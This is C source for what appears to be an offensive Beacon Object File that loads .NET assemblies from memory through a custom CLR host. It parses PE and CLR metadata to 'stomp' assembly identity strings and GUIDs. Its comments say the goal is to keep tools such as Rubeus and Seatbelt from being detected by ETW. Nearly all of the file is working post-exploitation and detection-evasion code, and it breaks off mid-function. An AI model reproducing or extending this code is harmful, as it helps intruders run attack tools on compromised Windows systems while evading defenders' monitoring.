#include <Windows.h>
#include "base\helpers.h" // beacon template stuff
#include "helpers.h" // our own helpers, like classes for COM
#include "CustomProviders.h"
#include <stdio.h>
#include <vector>
// recall that our boff obj can't have dependencies that aren't dynamically resolved by beacon loader

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */


#pragma comment(lib, "")

#ifdef _DEBUG
// convenience massaging 
#include <Shlwapi.h>
#include <oleauto.h>
#include <shellapi.h>
#include <metahost.h>
#include <mscoree.h>


#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "OleAut32.lib")
#pragma comment(lib, "Shell32.lib")

#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

const char OverwriteArray[] = "Secolve";

extern "C" {
    #include "beacon.h"

    //#include "sleepmask.h" // sliver doesn't support sleeping :) 

	// Define the Dynamic Function Resolution declaration for the GetLastError function
	DFR(KERNEL32, GetLastError);
	// Map GetLastError to KERNEL32$GetLastError 
	#define GetLastError KERNEL32$GetLastError 

	typedef enum E_ExecuteMethod {
		INVOKE_MEMBER, // invoke member
		JUMP_ENTRYPOINT, // look at entrypoint then jump there
	} E_ExecuteMethod;

	/* CUSTOM ASSEMBLY DEFINITIONS */
	HRESULT STDMETHODCALLTYPE CustomAssemblyStore_QueryInterface(IHostAssemblyStore* c_this, REFIID vTableGuid, void** ppv) {
		if (!ppv) return E_POINTER;
		*ppv = c_this;
		((CustomAssemblyStore*)c_this)->lpVtbl->AddRef((IHostAssemblyStore*)c_this);
		return S_OK;
	}

	ULONG STDMETHODCALLTYPE CustomAssemblyStore_AddRef(IHostAssemblyStore* c_this) {
		return(++((CustomAssemblyStore*)c_this)->Count);
	}

	ULONG STDMETHODCALLTYPE CustomAssemblyStore_Release(IHostAssemblyStore* c_this) {
		if (--((CustomAssemblyStore*)c_this)->Count == 0) {
			GlobalFree(c_this);
			return 0;
		}
		return ((CustomAssemblyStore*)c_this)->Count;
	}

	HRESULT STDMETHODCALLTYPE CustomAssemblyStore_ProvideAssembly(IHostAssemblyStore* c_this, AssemblyBindInfo* pBindInfo, UINT64* pAssemblyId, UINT64* pContext, IStream** ppStmAssemblyImage, IStream** ppStmPDB) {

		//Check if the identity of the assembly being loaded is the one we want
		if (wcscmp(((CustomHostControl*)c_this)->TargetAssembly->AssemblyIdentity, pBindInfo->lpPostPolicyIdentity) == 0) {

			((CustomHostControl*)c_this)->TargetAssembly->AssemblyStream = SHCreateMemStream((const byte*)((CustomHostControl*)c_this)->TargetAssembly->AssemblyBytes, ((CustomHostControl*)c_this)->TargetAssembly->AssemblySize);

			if (!((CustomHostControl*)c_this)->TargetAssembly->AssemblyStream) {
				DEBUG_PRINT("[!] Trying to load empty assembly stream!");
				return -1;
			}

			DEBUG_PRINT("[+] Targeted assembly requested, loading...\n");
			//  A pointer to host-specific data that is used to determine the evidence of the requested assembly 
			// without the need of a platform invoke call. pHostContext corresponds to the HostContext property of the managed Assembly class.
			// just give it some random garbage?
			*pContext = 12345;
			// need some random unique value
			*pAssemblyId = 699012345;
			// Give it the stream we loaded before
			*ppStmPDB = NULL; // PDB info, we dont care give it null
			*ppStmAssemblyImage = ((CustomHostControl*)c_this)->TargetAssembly->AssemblyStream;

			return S_OK;
		}

		//If it's not our assembly then tell the CLR to handle it
		return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND);
	}

	// tell clr to handle, but should never happen?
	HRESULT STDMETHODCALLTYPE CustomAssemblyStore_ProvideModule(IHostAssemblyStore* c_this, ModuleBindInfo* pBindInfo, DWORD* pdwModuleId, IStream** ppStmModuleImage, IStream** ppStmPDB) {
		DEBUG_PRINT("[*] Telling CLR to handle looking for module: %ls\n", pBindInfo->lpAssemblyIdentity);
		return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND);
	}


#if 0
	class CustomAssemblyStore : public IHostAssemblyStore {
		DWORD count = 0; // The internal reference counter that AddRef maintains should be a 32-bit unsigned integer.-> i.e. dword

	public:
		TargetAssembly* Assembly;

		HRESULT STDMETHODCALLTYPE ProvideAssembly(
			/* [in] */ AssemblyBindInfo* pBindInfo,
			/* [out] */ UINT64* pAssemblyId,
			/* [out] */ UINT64* pHostContext,
			/* [out] */ IStream** ppStmAssemblyImage,
			/* [out] */ IStream** ppStmPDB) {

			// !!TESTING!!
			//return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND);
			// TODO: double check internals 

			// Identity string check. Recall TODO for string stomping 

			/*
				The identity value returned for pAssemblyId is specified by the host. Identifiers must be unique within the lifetime of a process.
				The CLR uses this value as a unique identifier for the stream. It checks each value against the values for pAssemblyId returned by
				other calls to ProvideAssembly. If the host returns the same pAssemblyId value for another IStream, the CLR checks whether the
				contents of that stream have already been mapped. If so, the runtime loads the existing copy of the image instead of mapping
				a new one.
			*/
			DEBUG_PRINT("[*] ProvideAssembly consulted:\n");
			DEBUG_PRINT("	- Pre Policy ID: %ls\n", pBindInfo->lpReferencedIdentity);
			DEBUG_PRINT("	- Post Policy ID: %ls\n", pBindInfo->lpPostPolicyIdentity);
			DEBUG_PRINT("	- Target Assembly ID: %ls\n", this->Assembly->AssemblyIdentity);
			// https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/assemblybindinfo-structure
			// The identifier for the referenced assembly after the application of any binding policy values.
			if (wcscmp(this->Assembly->AssemblyIdentity, pBindInfo->lpPostPolicyIdentity) == 0) {
				// Reset assembly stream seek since it was consumed earlier ?
				// Assembly->AssemblyStream = Seek();

				Assembly->AssemblyStream = SHCreateMemStream((const byte*)Assembly->AssemblyBytes, Assembly->AssemblySize);

				if (!Assembly->AssemblyStream) {
					DEBUG_PRINT("[!] Trying to load empty assembly stream!");
					return -1;
				}

				DEBUG_PRINT("[+] Targeted assembly requested, loading...\n");
				//  A pointer to host-specific data that is used to determine the evidence of the requested assembly 
				// without the need of a platform invoke call. pHostContext corresponds to the HostContext property of the managed Assembly class.
				// just give it some random garbage?
				*pHostContext = 12345;
				// need some random unique value
				*pAssemblyId = 699012345;
				// Give it the stream we loaded before
				*ppStmPDB = NULL; // PDB info, we dont care give it null
				*ppStmAssemblyImage = Assembly->AssemblyStream;

				return S_OK;
			}
			// Otherwise, tell CLR to handle loading
			return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND);
		}

		// Resolves a module within an assembly or a linked (not embedded) resource file.
		HRESULT STDMETHODCALLTYPE ProvideModule(
			/* [in] */ ModuleBindInfo* pBindInfo,
			/* [out] */ DWORD* pdwModuleId,
			/* [out] */ IStream** ppStmModuleImage,
			/* [out] */ IStream** ppStmPDB) {

			DEBUG_PRINT("[*] Telling CLR to handle looking for module: %ls\n", pBindInfo->lpAssemblyIdentity);

			// not our problem
			return HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND);
		}

		ULONG STDMETHODCALLTYPE AddRef() {
			count++;
			return count;
		}

		ULONG STDMETHODCALLTYPE Release() {
			count--;
			if (count == 0) {
				delete this;
				return 0;
			}

			return count;
		}

		HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) {
			// idk does it even really matter 
			if (!ppvObject) return E_POINTER;
			*ppvObject = this;
			AddRef();
			return S_OK;
		}
	};
#endif 

	HRESULT STDMETHODCALLTYPE CustomAssemblyManager_QueryInterface(IHostAssemblyManager* c_this, REFIID vTableGuid, void** ppv) {
		if (!ppv) return E_POINTER;
		*ppv = c_this;
		((CustomAssemblyManager*)c_this)->lpVtbl->AddRef(c_this);
		return S_OK;
	}

	ULONG STDMETHODCALLTYPE CustomAssemblyManager_AddRef(IHostAssemblyManager* c_this) {
		return(++((CustomAssemblyManager*)c_this)->Count);
	}

	ULONG STDMETHODCALLTYPE CustomAssemblyManager_Release(IHostAssemblyManager* c_this) {
		if (--((CustomAssemblyManager*)c_this)->Count == 0) {
			GlobalFree(c_this);
			return 0;
		}
		return ((CustomAssemblyManager*)c_this)->Count;
	}

	HRESULT STDMETHODCALLTYPE CustomAssemblyManager_GetNonHostStoreAssemblies(IHostAssemblyManager* c_this, ICLRAssemblyReferenceList** ppReferenceList) {
		*ppReferenceList = NULL;
		return S_OK;
	}

	//This is responsible for returning our IHostAssemblyStore implementation
	HRESULT STDMETHODCALLTYPE CustomAssemblyManager_GetAssemblyStore(IHostAssemblyManager* c_this, IHostAssemblyStore** ppAssemblyStore) {
		CustomAssemblyStore* AssemblyStore = (CustomAssemblyStore*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, sizeof(CustomAssemblyManager));
		AssemblyStore->lpVtbl = &CustomAssemblyStore_Vtbl;
		AssemblyStore->TargetAssembly = ((CustomAssemblyManager*)c_this)->TargetAssembly;
		//((CustomAssemblyManager*)c_this)->AssemblyStore = AssemblyStore;
		*ppAssemblyStore = (IHostAssemblyStore*) AssemblyStore;

		return S_OK;
	}

#if 0
	// Custom assembly manager. We NEED to also implement the AssemblyStore (which houses the actual provideassembly method)
	class CustomAssemblyManager : public IHostAssemblyManager {
		DWORD count = 0;
	public:
		TargetAssembly* Assembly;

		// Gets an interface pointer to an ICLRAssemblyReferenceList that represents the list of assemblies that the host expects the CLR to load.
		// Return NULL so that we always handle it instead of the CLR
		HRESULT STDMETHODCALLTYPE GetNonHostStoreAssemblies(
			/* [out] */ ICLRAssemblyReferenceList** ppReferenceList) {
			DEBUG_PRINT("[*] Telling CLR that we should handle loading all assemblies\n");
			*ppReferenceList = NULL;
			return S_OK;
		}

		HRESULT STDMETHODCALLTYPE GetAssemblyStore(
			/* [out] */ IHostAssemblyStore** ppAssemblyStore) {

			// Verbatim:
			// In providing an implementation of IHostAssemblyStore, the host specifies its intent to resolve all assemblies that are not referenced 
			// by the ICLRAssemblyReferenceList returned from IHostAssemblyManager::GetNonHostStoreAssemblies.
			CustomAssemblyStore* AssemblyStore = new CustomAssemblyStore();
			AssemblyStore->Assembly = Assembly;

			*ppAssemblyStore = AssemblyStore;

			return S_OK;
		}

		ULONG STDMETHODCALLTYPE AddRef() {
			count++;
			return count;
		}

		ULONG STDMETHODCALLTYPE Release() {
			count--;
			if (count == 0) {
				delete this;
				return 0;
			}

			return count;
		}

		HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) {
			// should really check riid
			// idk does it even really matter 
			if (!ppvObject) return E_POINTER;
			*ppvObject = this;
			AddRef();
			return S_OK;
		}
	};
#endif 

	// Our custom host control; this interface provides our custom memory manager and assembly loader

	/* C++ inheritance from c style interfaces doesnt work w/o doing some legwork to override vtbl pointers 
		probably easier and more consistent to do c style class*/
	HRESULT STDMETHODCALLTYPE CustomHostControl_QueryInterface(IHostControl* c_this, REFIID vTableGuid, void** ppv) {
		/*
		if (!IsEqualIID(vTableGuid, &IID_IUnknown) && !IsEqualIID(vTableGuid, &xIID_IHostControl)) {
			*ppv = 0;
			return E_NOINTERFACE;
		}
		*/
		if (!ppv) return E_POINTER;
		*ppv = c_this;
		((CustomHostControl*)c_this)->lpVtbl->AddRef((IHostControl*)c_this);
		return S_OK;
	}

	ULONG STDMETHODCALLTYPE CustomHostControl_AddRef(IHostControl* c_this) {
		return(++((CustomHostControl*)c_this)->Count);
	}

	ULONG STDMETHODCALLTYPE CustomHostControl_Release(IHostControl* c_this) {
		if (--((CustomHostControl*)c_this)->Count == 0) {
			GlobalFree(c_this);
			return 0;
		}
		return ((CustomHostControl*)c_this)->Count;
	}


	

	//This is responsible for returning all of our manager implementations
	//If you want to disable an interface just comment out the if statement
	HRESULT STDMETHODCALLTYPE CustomHostControl_GetHostManager(IHostControl* c_this, REFIID riid, void** ppObject)
	{

		/*
		if (IsEqualIID(riid, &IID_IHostMemoryManager))
		{
			*ppObject = this->memoryManager;

			return S_OK;
		}
		*/
		
		// why the fuck does this cause an undefined memcmp symbol to be included in relocation?
		// ah fuck "==" is overloaded to the macro that invokes memcmp. can't have that - explicitly do the comparison

		if (InlineIsEqualGUID(riid, IID_IHostAssemblyManager))
		{
			
			//Create our IHostAssemblyManager interface and return it
			CustomAssemblyManager* AssemblyManager = (CustomAssemblyManager*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, sizeof(CustomAssemblyManager));
			AssemblyManager->lpVtbl = &CustomAssemblyManager_Vtbl;
			AssemblyManager->TargetAssembly = ((CustomHostControl*)c_this)->TargetAssembly;
			//AssemblyManager->AssemblyStore = NULL;
			*ppObject = AssemblyManager;
			return S_OK;
		}
		
		*ppObject = NULL;
		return E_NOINTERFACE;
	}


	HRESULT CustomHostControl_SetAppDomainManager(IHostControl* This, DWORD dwAppDomainID, IUnknown* pUnkAppDomainManager) {
		return E_NOTIMPL;
	}

#if 0
	class CustomHostControl : public IHostControl {
	public:
		DWORD count = 0;
		TargetAssembly* Assembly;

		HRESULT STDMETHODCALLTYPE GetHostManager(
			/* [in] */ REFIID riid,
			/* [out] */ void** ppObject) {

			if (riid == IID_IHostMemoryManager) {
				// TODO: IF WE WANT CUSTOM MEMORY MANAGEMENT
				*ppObject = NULL;
				return E_NOINTERFACE;
			}

			if (riid == IID_IHostAssemblyManager) {
				// Instance and return our custom assembly manager
				CustomAssemblyManager* AssemblyManager = new CustomAssemblyManager();

				AssemblyManager->Assembly = Assembly; // actual assembly struct

				*ppObject = AssemblyManager;
				return S_OK;
			}

			*ppObject = NULL;
			return E_NOINTERFACE;

		}

		// we never need to call this?
		HRESULT STDMETHODCALLTYPE SetAppDomainManager(
			/* [in] */ DWORD dwAppDomainID,
			/* [in] */ IUnknown* pUnkAppDomainManager) {

			return E_NOTIMPL;
		}

		ULONG STDMETHODCALLTYPE AddRef() {
			count++;
			return count;
		}

		ULONG STDMETHODCALLTYPE Release() {
			count--;
			if (count == 0) {
				delete this;
				return 0;
			}

			return count;
		}

		HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) {
			// should really check riid
			// idk does it even really matter 
			if (!ppvObject) return E_POINTER;
			*ppvObject = this;
			AddRef();
			return S_OK;
		}
	};
#endif
	DWORD ResolveVA(DWORD VirtualAddress, unsigned char* AssemblyBytes, IMAGE_DOS_HEADER* DOS_HEADER, size_t NTHeadersSize, WORD NumberOfSections) {
		IMAGE_SECTION_HEADER* SectionHeader = NULL;
		unsigned char* Cursor = (unsigned char*)AssemblyBytes + (DOS_HEADER->e_lfanew + NTHeadersSize);
		for (int i = 0; i < NumberOfSections; i++) {
			SectionHeader = (IMAGE_SECTION_HEADER*)Cursor;

			// i.e. do we live here
			if (VirtualAddress >= SectionHeader->VirtualAddress
				&& VirtualAddress < (SectionHeader->VirtualAddress + SectionHeader->Misc.VirtualSize)) {
				break;
			}

			Cursor += IMAGE_SIZEOF_SECTION_HEADER;
		}

		if (!SectionHeader) {
			DEBUG_PRINT("	[*] Error during VA lookup. Aborting ID stomp\n");
			return false;
		}

		DWORD ResolvedOffset = (VirtualAddress - SectionHeader->VirtualAddress) + SectionHeader->PointerToRawData;
		return ResolvedOffset;
	}

	WORD LogBase2(WORD X) {
		// we want the ceiling, cos we use this to translate to #bits
		if (X <= 0) return 0;
		WORD Result = 1;
		while (X >>= 1) Result++;
		return Result;
	}

	bool CodedIndexHelper(WORD* RelevantLargeCodedIndexArray, WORD SizeOfArray, DWORD NumberPerTable[64]) {
		DWORD Max = 0;
		WORD CountedTables = 0;
		for (WORD i = 0; i < SizeOfArray; i++) {
			const WORD& RelevantTable = RelevantLargeCodedIndexArray[i];
			if (NumberPerTable[RelevantTable]) {
				if (NumberPerTable[RelevantTable] > Max) Max = NumberPerTable[RelevantTable];
				CountedTables += 1;
			}
			// spec is a bit vague whether this is factored in. through trial and error I think no?
			//CountedTables += 1;
		}

		// i.e. do we need a dword to addr this?
		if (Max >= (DWORD)(1 << (16 - LogBase2(CountedTables)))) return true;
		return false;
	}

	typedef struct {
		size_t capacity;
		size_t size; // the current num of elements
		DWORD* data;
	} DWORD_VECTOR;
	// pseudo vectors
	DWORD_VECTOR* create_vector(size_t n) {
		DWORD_VECTOR *v = (DWORD_VECTOR*)malloc(sizeof(DWORD_VECTOR));
		if (v) {
			v->data = (DWORD*)malloc(n * sizeof(DWORD));
			v->capacity = n;
			v->size = 0;
		}
		return v;
	}

	void delete_vector(DWORD_VECTOR* v) {
		if (v) {
			free(v->data);
			free(v);
		}
	}

	size_t resize_vector(DWORD_VECTOR* v, size_t n) {
		if (v) {
			DWORD* p = (DWORD*)realloc(v->data, n * sizeof(DWORD));
			if (p) {
				v->data = p;
				v->capacity = n;
			}
			return v->capacity;
		}
		return 0;
	}

	// "index" 
	DWORD get_vector(DWORD_VECTOR* v, size_t n) {
		if (v && n < v->capacity) {
			return v->data[n];
		}
		return -1; // can't throw exceptions in BOF. return unsigned equiv of -1
	}

	void push_vector(DWORD_VECTOR* v, DWORD x) {
		if (v) {
			if (v->size >= v->capacity) {
				v->capacity *= 2;
				resize_vector(v, v->capacity); // instead of smartly chunking it out just multiply by 2
				
			}
			v->data[v->size] = x; // use old size as index
			v->size += 1;
		}
	}

	/*
	void set_vector(DWORD_VECTOR* v, size_t n, DWORD x) {
		if (v) {
			if (n >= v->capacity) {
				resize_vector(v, n);
			}
			v->data[n] = x;
		}
	}
	*/

	bool StompIdentity(unsigned char* AssemblyBytes) {

		// oh boy
		DEBUG_PRINT("[*] === STOMPING .NET ASSEMBLY ===\n");

		// we need to navigate to the 15th (index 14) data directory
		// which is the .NET directory
		// then overwrite some shit so we don't have Rubeus or Seatbelt being sniffed up by ETW somewhere inside CLR

		unsigned char* Cursor = AssemblyBytes;

		IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)Cursor;
		WORD PEArch;

		Cursor += sizeof(IMAGE_DOS_HEADER);

		// redundant, but validate that this is a PE header MZ 
		if (DOS_HEADER->e_magic != IMAGE_DOS_SIGNATURE) {
			DEBUG_PRINT("	[!] Invalid PE Signature %hu - not stomping ID\n", DOS_HEADER->e_magic);
			return false;
		}

		// offset to new exe header (last 4 bytes of dos header) + size of PE sig + size of file header
		// this puts us at the beginning of the optional header so we can see what architecture we're on

		Cursor = (unsigned char*)AssemblyBytes + (DOS_HEADER->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

		memcpy(&PEArch, Cursor, sizeof(WORD));
		DWORD NumberOfRvaAndSizes;
		WORD NumberOfSections;
		size_t NTHeadersSize;
		IMAGE_DATA_DIRECTORY* DataDirectories;

		bool Arch64 = false;

		// havent tested 32
		if (PEArch == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
			// 32 bit 
			DEBUG_PRINT("	[*] Valid 32 bit PE\n");

			IMAGE_OPTIONAL_HEADER32* OptionalHeader = (IMAGE_OPTIONAL_HEADER32*)Cursor;
			NumberOfRvaAndSizes = OptionalHeader->NumberOfRvaAndSizes;
			DataDirectories = OptionalHeader->DataDirectory;

			// jump back and grab NT Header
			Cursor = (unsigned char*)AssemblyBytes + DOS_HEADER->e_lfanew;
			IMAGE_NT_HEADERS32* NTHeader = (IMAGE_NT_HEADERS32*)Cursor;
			NumberOfSections = NTHeader->FileHeader.NumberOfSections;

			NTHeadersSize = sizeof(IMAGE_NT_HEADERS32);
		}
		else if (PEArch == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
			// 64 bit
			DEBUG_PRINT("	[*] Valid 64 bit PE\n");
			Arch64 = true;

			IMAGE_OPTIONAL_HEADER64* OptionalHeader = (IMAGE_OPTIONAL_HEADER64*)Cursor;
			NumberOfRvaAndSizes = OptionalHeader->NumberOfRvaAndSizes;
			DataDirectories = OptionalHeader->DataDirectory;

			Cursor = (unsigned char*)AssemblyBytes + DOS_HEADER->e_lfanew;
			IMAGE_NT_HEADERS64* NTHeader = (IMAGE_NT_HEADERS64*)Cursor;
			NumberOfSections = NTHeader->FileHeader.NumberOfSections;

			NTHeadersSize = sizeof(IMAGE_NT_HEADERS64);
		}
		else {
			// wazzifuck. could be a ROM image
			DEBUG_PRINT("	[!] Invalid architecture bytes (%hu) in optional header (ROM image??). Aborting ID stomp\n", PEArch);
			return false;
		}



		if (NumberOfRvaAndSizes < 15) {
			DEBUG_PRINT("	[!] Less than 15 data directories - i.e. no .NET directory. Aborting ID stomp\n");
			return false;
		}



		IMAGE_DATA_DIRECTORY NETDirectory = DataDirectories[14];



		// now, we need to resolve the RVA to an actual offset
		DEBUG_PRINT("	[*] Iterating %hu sections to resolve VA\n", NumberOfSections);

		//IMAGE_SECTION_HEADER* SectionHeaders = (IMAGE_SECTION_HEADER*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IMAGE_SECTION_HEADER) * NumberOfSections);
		/*
		IMAGE_SECTION_HEADER* SectionHeader = NULL;
		Cursor = (unsigned char*)AssemblyBytes + (DOS_HEADER->e_lfanew + NTHeadersSize);
		for (int i = 0; i < NumberOfSections; i++) {
			SectionHeader = (IMAGE_SECTION_HEADER*)Cursor;

			// i.e. do we live here
			if (NETDirectory.VirtualAddress >= SectionHeader->VirtualAddress
				&& NETDirectory.VirtualAddress < (SectionHeader->VirtualAddress + SectionHeader->Misc.VirtualSize)) {
				break;
			}

			Cursor += IMAGE_SIZEOF_SECTION_HEADER;
		}

		if (!SectionHeader) {
			log("	[*] Error during VA lookup. Aborting ID stomp\n");
			return false;
		}
		*/

		DWORD ResolvedNETOffset = ResolveVA(NETDirectory.VirtualAddress, AssemblyBytes, DOS_HEADER, NTHeadersSize, NumberOfSections);

		DEBUG_PRINT("	[*] NET data located at offset 0x%x\n", ResolvedNETOffset);

		Cursor = (unsigned char*)AssemblyBytes + ResolvedNETOffset;


		// https://stackoverflow.com/questions/43753084/com-descriptor-in-pe-files
		IMAGE_COR20_HEADER* CLRHeader = (IMAGE_COR20_HEADER*)Cursor;

		IMAGE_DATA_DIRECTORY CLRMetaDataDirectory = CLRHeader->MetaData;
		DWORD ResolvedMetaDataOffset = ResolveVA(CLRMetaDataDirectory.VirtualAddress, AssemblyBytes, DOS_HEADER, NTHeadersSize, NumberOfSections);

		DEBUG_PRINT("	[*] NET metadata located at offset 0x%x\n", ResolvedMetaDataOffset);

		unsigned char* MetadataHeaderAddr = (unsigned char*)AssemblyBytes + ResolvedMetaDataOffset;
		Cursor = MetadataHeaderAddr;
		CLRMetaData* CLRMetaDataHeader = (CLRMetaData*)Cursor;

		// whath appens if we just... blank out the metadata pointer?
		// the answer is the CLR spits out an invalid arg error.
		//CLRHeader->MetaData.VirtualAddress = 0;
		//CLRHeader->MetaData.Size = 0;


		// https://github.com/jbevain/cecil/blob/3136847ea620fb9b4a3ff96bc4f573148e8bd2e4/Mono.Cecil.PE/ImageReader.cs#L276
		// https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-clr-metadata-3/  <- looks like some minor incorrect statements
		// https://codingwithspike.wordpress.com/2012/08/12/building-a-net-disassembler-part-3-parsing-the-text-section/ <--- suspect structures...
		// https://wwh1004.com/en/net-trick-to-bypass-any-anti-dumping/
		// https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/metadata/?redirectedfrom=MSDN ? 
		// this probably isn't monitored by anything but lets stay in house 

		// ok i'll just read the fucking ecma spec
		// https://ecma-international.org/wp-content/uploads/ECMA-335_6th_edition_june_2012.pdf pg 209

		// this is where it gets annoying
		// version string is potentially variable length (this is the CLR version)

		// TODO: read version string and try allocate appropriate runtime

		Cursor += sizeof(CLRMetaData) + CLRMetaDataHeader->VersionStringLength;

		// cursor now pointing at flags. not sure what they do lets skip past them 
		Cursor += 2;

		// now at number of streams
		WORD NumberOfStreams = *(WORD*)Cursor;

		Cursor += 2;

		DEBUG_PRINT("	[*] Found %hu metadata streams\n", NumberOfStreams);

		//CLRStreamHeader** StreamHeaders = (CLRStreamHeader**)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CLRStreamHeader*) * NumberOfStreams);
		CLRStreamHeader** StreamHeaders = (CLRStreamHeader**)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, sizeof(CLRStreamHeader*) * NumberOfStreams);

		// Now at the stream headers. 
		// ANY OFFSETS GIVEN HERE ARE RELATIVE TO THE METADATA HEADER
		for (int i = 0; i < NumberOfStreams; i++) {
			StreamHeaders[i] = (CLRStreamHeader*)Cursor;

			// now we need to set the variable length name
			// it should sit at the string which is null terminated

			//log("	  [*] Found stream %s\n", StreamHeaders[i]->StreamName);

			// the annoying part is that these strings are padded
			// get how much we need to jump 
			size_t NullTerminatedLength = strlen(StreamHeaders[i]->StreamName) + 1;
			// find next boundary of 4 when factoring in null terminator
			WORD ExtraJumpLength = (NullTerminatedLength + 3) & ~0x03;
			// recall we use a char array in struct so cant just blindly use sizeof
			Cursor += sizeof(DWORD) + sizeof(DWORD) + ExtraJumpLength;
		}

		// just in case these are signatured store them 

		// think this indicates its compressed which is the usual
		char ID_TopLevelC[] = { '#', '~', '\0' };
		char ID_TopLevel[] = { '#', '-' , '\0' }; // TODO SUPPORT UNCOMPRESSED
		/* quote:

		The #GUID stream, as you would expect, contains GUIDs. This table contains a list of all of the 128-bit GUIDs used in the application,
		including the GUID that is used to uniquely identify this application. Whenever a program is compiled, it is assigned a new GUID to
		uniquely identify it. This is reminiscent of COM, which has similar unique identifiers that were registered in the registry for the
		local machine so that this component could be found.

		*/

		char ID_GUID[] = { '#','G','U','I','D', '\0' };
		char ID_Strings[] = { '#', 'S','t','r','i','n','g','s', '\0' };
		char ID_US[] = { '#','U','S', '\0' };

		// guid lives here, offset is in top level
		char ID_Blob[] = { '#','B','l','o','b', '\0' };

		/*
			https://secana.github.io/PeNet/api/PeNet.Header.Net.MaskValidType.html (not in order though)
			https://github.com/secana/PeNet/blob/master/src/PeNet/Header/Net/MetaDataTablesHdr.cs

			from lsb
		*/

		// vector of offsets (need to be multiplied by heap index multiplier) we want to stomp
		// DWord since they can be 4 bytes
		
		// i miss convenience
		/*
		std::vector<DWORD> OffsetsIntoStringToStomp;
		std::vector<DWORD> OffsetsIntoGUIDToStomp;
		*/

		// resize automatically past 20
		DWORD_VECTOR* OffsetsIntoStringToStomp = create_vector(20);
		DWORD_VECTOR* OffsetsIntoGUIDToStomp = create_vector(20);


		// type is potentially a dword, this pair is TYPE,VALUE
		//std::vector<std::pair<DWORD, WORD>> CustomAttributesToInspect;

		// lazily replace with in-sync dual vector
		DWORD_VECTOR* CustomAttributesToInspectFirst = create_vector(20);
		DWORD_VECTOR* CustomAttributesToInspectSecond = create_vector(20); // yeah whatever word can be a dword

		/*
			AssemblyTitle
			AssemblyDescription
			AssemblyCompany
			AssemblyProduct
			AssemblyCopyright
			AssemblyAttribute
		*/

		WORD AssemblyAttributeTypeRefIndices[6] = { 0 };
		WORD AssemblyAttributeMemberRefIndices[6] = { 0 };
		WORD GUIDTypeRefIndex = 0;
		WORD GUIDMemberRefIndex = 0;

		// TODO: variable width heap indexing not supported (when we have a lot of rows)
		bool LargeStringIndex = false;
		bool LargeGUIDIndex = false;
		bool LargeBlobIndex = false;

		char* StringHeapAddr = NULL;

		// im lazy and tired, this is for finding which TypeRef is String / GUID
		for (int i = 0; i < NumberOfStreams; i++) {
			Cursor = MetadataHeaderAddr + StreamHeaders[i]->Offset;
			if (strcmp(StreamHeaders[i]->StreamName, ID_Strings) == 0) StringHeapAddr = (char*)Cursor;
		}

		// now, iterate and populate what to stomp from #~ / #- first
		for (int i = 0; i < NumberOfStreams; i++) {

			Cursor = MetadataHeaderAddr + StreamHeaders[i]->Offset;

			if (strcmp(StreamHeaders[i]->StreamName, ID_TopLevelC) == 0) {

				CLRTableHeader* TableHeader = (CLRTableHeader*)Cursor;
				Cursor += sizeof(CLRTableHeader);

				/*
					Bit 0 (0x01) set: Indexes into #String are 4 bytes wide.
					Bit 1 (0x02) set: Indexes into #GUID heap are 4 bytes wide.
					Bit 2 (0x04) set: Indexes into #Blob heap are 4 bytes wide.
					If bit not set: indexes into heap is 2 bytes wide.
				*/

				if (TableHeader->HeapOffsetSizes & 1) LargeStringIndex = true;
				if (TableHeader->HeapOffsetSizes & 2) LargeGUIDIndex = true;
				if (TableHeader->HeapOffsetSizes & 4) LargeBlobIndex = true;

				// we are now looking at a series of DWORDs that describe how many entries are in each table.
				// iterate the active bit vector to see how many tables there are 
				WORD NumberOfTableTypes = 0;
				INT64 Mask = 1;

				// im lazy
				DWORD NumberPerTable[64] = { 0 };

				DWORD TotalEntries = 0;
				// think coded indices size is per table 
				//bool LargeCodedIndices = false;
				// technically spec only goes up to 0x2c or something
				for (int j = 0; j < 64; j++) {
					if (Mask & TableHeader->MaskValid) {
						// when we see a bit, ingest its number of entries
						DWORD NumberOfEntries = *(DWORD*)Cursor;
						NumberPerTable[j] = NumberOfEntries;
						TotalEntries += NumberOfEntries;
						NumberOfTableTypes++;
						Cursor += sizeof(DWORD); // each numberofentries is a dword
					}
					Mask = Mask << 1;
				}

				// number of table types = n

				// ghetto log base 2, keep dividing by two and checking that we're good



				DEBUG_PRINT("	[*] Found %hu table types\n", NumberOfTableTypes);

				// TODO: These sizes should be dynamic based on whether indices are small or large (rows in table) and whether total rows resizes coded indices
				// use the number per table to calculate for normal indices
				WORD TableSizes[64] = { 0 };
				TableSizes[ID_MODULE] = SIZE_TABLE_MODULE;
				TableSizes[ID_TYPE_REF] = SIZE_TABLE_TYPE_REF;
				TableSizes[ID_TYPE_DEF] = SIZE_TABLE_TYPE_DEF;
				TableSizes[ID_FIELD] = SIZE_TABLE_FIELD;
				TableSizes[ID_METHOD_DEF] = SIZE_TABLE_METHOD_DEF;
				TableSizes[ID_PARAM] = SIZE_TABLE_PARAM;
